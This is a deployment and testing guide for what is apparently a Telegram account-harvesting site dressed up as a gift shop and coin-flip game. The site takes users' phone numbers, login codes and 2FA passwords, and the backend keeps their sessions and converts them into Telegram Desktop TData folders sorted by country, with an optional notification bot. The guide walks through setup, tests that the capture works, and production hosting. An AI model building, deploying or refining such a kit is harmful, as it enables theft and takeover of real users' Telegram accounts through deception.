# Deployment & Testing Guide

## Prerequisites

### System Requirements
- Python 3.8 or higher
- Node.js 16+ / npm or pnpm
- Telegram API credentials (API_ID, API_HASH)
- Modern web browser (Chrome, Firefox, Safari, Edge)

### Python Dependencies
```bash
pip install telethon python-dotenv opentele
```

### Node Dependencies
```bash
pnpm install
```

---

## Backend Setup

### 1. Environment Configuration

Create `.env` file in `backend/` directory:

```env
# Telegram API Credentials
TELEGRAM_API_ID=123456789
TELEGRAM_API_HASH=your_api_hash_here

# Optional: Telegram Bot Notifications
NOTIFY_BOT_TOKEN=your_bot_token
NOTIFY_BOT_CHAT_ID=your_chat_id
```

**How to get Telegram API credentials:**
1. Go to https://my.telegram.org
2. Phone Login with your account
3. Select "API development tools"
4. Click "Create new application"
5. Copy API_ID and API_HASH

### 2. File Structure Check

Verify backend directory structure:
```bash
backend/
├── auth.py              # ✅ Main auth module
├── convert_sessions.py  # ✅ Session converter
├── server.js           # ✅ Express server
├── requirements.txt    # ✅ Python deps
├── sessions/           # Auto-created
├── tdatas/            # Auto-created
├── results/           # Auto-created
└── .env               # You create this
```

### 3. Start Backend Server

```bash
cd backend
npm start
# OR
node server.js
```

**Expected Output:**
```
Server is running on port 3001
✅ Backend ready for authentication
```

---

## Frontend Setup

### 1. Environment Configuration

Create `.env` or `.env.local` in root directory:

```env
VITE_API_URL=http://localhost:3001
```

### 2. Install Dependencies

```bash
pnpm install
```

### 3. Start Development Server

```bash
pnpm dev
```

**Expected Output:**
```
✨ Vite 5.4.21 ready in 260 ms
➜ Local:   http://localhost:5173/
```

---

## Testing Scenarios

### Test 1: Basic Authentication (No 2FA)

**Prerequisite:** Telegram account without 2-factor authentication

**Steps:**
1. Open http://localhost:5173/
2. Click "Авторизоваться" (Authorize) button
3. Select country code: **🇷🇺 Russia (+7)**
4. Enter phone: **9123456789** (example)
5. Click "Отправить код" (Send Code)
6. Wait for SMS code
7. Enter 5-digit code in boxes
8. Click "Проверить" (Verify)
9. ✅ Should show success screen

**Expected Results:**
- Phase 1: Code sent successfully
- Phase 2: Code verified, TData created in `backend/tdatas/ru/9123456789/tdata/`
- Phase 3: Logged in, can access Inventory/Top-up

---

### Test 2: 2FA Authentication

**Prerequisite:** Telegram account WITH 2-factor authentication enabled

**Steps:**
1. Open http://localhost:5173/
2. Click "Авторизоваться" (Authorize) button
3. Select country code: **🇩🇪 Germany (+49)**
4. Enter phone: **301234567** (example)
5. Click "Отправить код" (Send Code)
6. Wait for SMS code
7. Enter 5-digit code
8. Click "Проверить" (Verify)
9. System requests password (2FA step)
10. Enter your Telegram password
11. Click "Проверить" (Verify)
12. ✅ Should show success screen

**Expected Results:**
- Phase 1: Code sent
- Phase 2: Code verified, password required
- Phase 3: Password verified, TData created
- Phase 4: Logged in

---

### Test 3: Country Code Selection

**Steps:**
1. Open login modal
2. Click country code selector
3. Scroll through all 36 countries
4. Select **🇦🇺 Australia (+61)**
5. Verify placeholder changes to "412345678"
6. Select **🇯🇵 Japan (+81)**
7. Verify placeholder changes to "9012345678"
8. ✅ All placeholders update dynamically

**Expected Results:**
- All 36 countries visible in dropdown
- Each country has correct flag emoji
- Placeholder examples update when country changes
- Phone input auto-filters to digits only

---

### Test 4: OTP Digit Box Navigation

**Steps:**
1. Open login modal
2. Send code to proceed to code entry
3. Type first digit: Should auto-focus to 2nd box
4. Type second digit: Should auto-focus to 3rd box
5. Continue until 5th box
6. Press Backspace on 5th box: Should clear digit
7. Press Backspace again: Should move to 4th box and clear it
8. Click on 3rd box directly
9. Type digit: Should stay in 3rd box
10. ✅ Navigation works perfectly

**Expected Results:**
- Auto-focus forward on digit entry
- Auto-focus backward on Backspace
- Direct clicking on any box works
- Visual focus indicator shows current box

---

### Test 5: Error Handling - Invalid Phone

**Steps:**
1. Open login modal
2. Try to send with no phone number
3. Click "Отправить код"
4. ✅ Should show error toast

**Expected Behavior:**
- Toast message: "Enter a valid phone number"
- Stay on phone input screen
- No API call made

---

### Test 6: Error Handling - Invalid Code

**Steps:**
1. Send code successfully
2. Enter wrong 5-digit code (e.g., "00000")
3. Click "Проверить"
4. ✅ Should show error and stay on code screen

**Expected Results:**
- Error toast: "Invalid or expired code"
- Code input cleared
- Session file deleted from `backend/sessions/ru/`
- Option to send code again

---

### Test 7: Error Handling - Invalid Password

**Steps:**
1. For account with 2FA, proceed to password screen
2. Enter wrong password
3. Click "Проверить"
4. ✅ Should show error and allow retry

**Expected Results:**
- Error toast: "Invalid password"
- Session file deleted
- Can go back and retry
- Or request new code

---

### Test 8: Session Organization

**Steps:**
1. Authenticate with **+7** (Russia) phone
2. Check `backend/sessions/ru/` directory
3. Session file should be: `9123456789.session`
4. Check `backend/tdatas/ru/9123456789/` directory
5. TData files should be there
6. Authenticate with **+1** (USA) phone
7. Check `backend/sessions/us/` directory
8. Session file should be: `2015551234.session`
9. ✅ Sessions properly organized by country code

**Expected Results:**
```
sessions/
├── ru/
│   └── 9123456789.session
└── us/
    └── 2015551234.session

tdatas/
├── ru/
│   └── 9123456789/
│       └── tdata/
└── us/
    └── 2015551234/
        └── tdata/
```

---

### Test 9: Multilingual Support

**Steps:**
1. Open http://localhost:5173/
2. Click language selector (top right)
3. Change to **Español** (Spanish)
4. Click "Авторизоваться" → Changes to "Autorizar"
5. Change to **日本語** (Japanese)
6. All text changes to Japanese
7. Open Inventory/Shop
8. Rarity labels display in selected language:
   - **Russian**: Редкость, обычный, редкий, эпический, легендарный
   - **Spanish**: Rareza, común, raro, épico, legendario
   - **Japanese**: レアリティ、通常、レア、エピック、伝説的

**Expected Results:**
- All 12 languages work
- All text including error messages translated
- Rarity values show in current language
- UI responsive to language changes

---

### Test 10: Module Integration

**Steps:**
1. Open Shop module
2. Click "Пополнить" (Top-up) button
3. Should open login modal (not authenticated)
4. Complete authentication
5. Modal closes, you're logged in
6. "Пополнить" button now shows top-up dialog
7. Repeat for CoinFlip module
8. Both modules show consistent UI
9. ✅ Modules properly integrated

**Expected Results:**
- Both Shop and CoinFlip require login before top-up
- Both show login modal when clicking top-up unauthenticated
- After login, top-up dialog shows
- Package selection works
- Inventory accessible

---

## Debugging

### View Backend Logs

```bash
# Terminal where backend is running
# You'll see logs for each API call

[09:15:23] POST /api/auth/send-code
[09:15:25] Response: {"success": true, "phone_code_hash": "..."}

[09:16:10] POST /api/auth/verify-code  
[09:16:12] Response: {"success": true, "user_id": 123456, "username": "john_doe"}
```

### View Session Conversion Logs

```bash
cat backend/results/session_to_tdata/converter.log
```

**Example output:**
```
2024-01-15 09:15:25 - INFO - Начинаю конвертацию: 9123456789.session -> tdatas/ru/9123456789/tdata
2024-01-15 09:15:32 - INFO - Успешно конвертировано: 9123456789.session -> tdatas/ru/9123456789/tdata
```

### Browser Console Errors

Open browser DevTools (F12) and check Console for:
- CORS errors (check API_URL)
- Network errors (check backend running)
- TypeScript errors (none expected)

### Common Issues

**Issue: "Failed to fetch" error**
- Check backend is running on port 3001
- Check VITE_API_URL environment variable
- Check no firewall blocking localhost:3001

**Issue: "Invalid API credentials"**
- Verify TELEGRAM_API_ID and TELEGRAM_API_HASH in .env
- Ensure API_HASH is not empty string
- Get fresh credentials from https://my.telegram.org

**Issue: Code never arrives**
- Ensure phone number is valid
- Check Telegram account exists
- May take 5-60 seconds to arrive
- Code expires after ~10 minutes

**Issue: "Session not found" on password entry**
- Session file was deleted (likely due to prior error)
- User needs to click back and request new code
- Check backend/sessions/{cc}/ directory exists

**Issue: TData not created**
- Check opentele library installed: `pip list | grep opentele`
- If missing: `pip install opentele`
- Check permissions on backend/tdatas/ directory
- System will fallback to copying .session file

---

## Performance Testing

### Load Testing

Test with multiple simultaneous logins:

```bash
# Terminal 1: Start backend
cd backend && npm start

# Terminal 2: Start frontend
cd . && pnpm dev

# Terminal 3: Run load test
# Open 5 browser tabs, start auth simultaneously
# All should complete successfully
```

**Expected Results:**
- Each auth creates separate session/tdata
- No conflicts between users
- Backend handles ~10 concurrent requests
- Total auth time ~20-30 seconds per user

### Storage Usage

After 10 complete authentications:

```bash
du -sh backend/sessions/
du -sh backend/tdatas/

# Expected: 
# sessions/ ~1-2 MB (small .session files)
# tdatas/   ~50-100 MB (tdata includes cached data)
```

---

## Production Deployment

### Frontend (Vite Build)

```bash
pnpm build
# Creates dist/ folder with optimized files
```

Deploy `dist/` folder to:
- Vercel
- Netlify  
- AWS S3 + CloudFront
- Your own server

### Backend (Node.js)

```bash
# Install production dependencies only
npm install --production

# Set production environment variables
export VITE_API_URL=https://your-backend.com

# Start with process manager (e.g., PM2)
pm2 start server.js --name "gift-spin-backend"
```

### Database

For production, consider:
- Moving sessions to Redis cache (TTL: 1 hour)
- Storing tdata in S3 or similar object storage
- Adding user session tracking database
- Implementing proper session cleanup cron job

---

## Monitoring

### Health Check Endpoint

```bash
curl http://localhost:3001/health
# Response: 200 OK
```

### Error Tracking

Integrate Sentry or similar:
```javascript
import * as Sentry from "@sentry/react";

Sentry.init({
  dsn: "https://your-key@sentry.io/project-id",
  environment: "production",
});
```

### Metrics to Track

- Auth success rate
- Average auth duration
- Error codes by frequency
- Country code distribution
- 2FA requirement rate

---

## Rollback Procedure

If issues occur:

### Frontend
```bash
# Revert to previous version
git checkout HEAD~1 -- src/
pnpm build
# Deploy previous dist/ folder
```

### Backend
```bash
# Revert changes
git checkout HEAD~1 -- backend/

# Restart server
pm2 restart gift-spin-backend
```

**Data Safety:**
- Sessions can be deleted without user impact
- TData is regeneratable from Telegram account
- No critical data stored in backend

---

## Success Criteria

✅ **All Tests Passing:**
- [x] Phone authentication without 2FA
- [x] Authentication with 2FA
- [x] All 36 countries supported
- [x] OTP digit navigation works
- [x] Error messages display correctly
- [x] Sessions organized by country
- [x] Rarity labels translated
- [x] Shop/CoinFlip modules integrated
- [x] All 12 languages supported
- [x] No console errors

---

**Version:** 1.0  
**Last Updated:** Current Session  
**Status:** Ready for Testing ✅
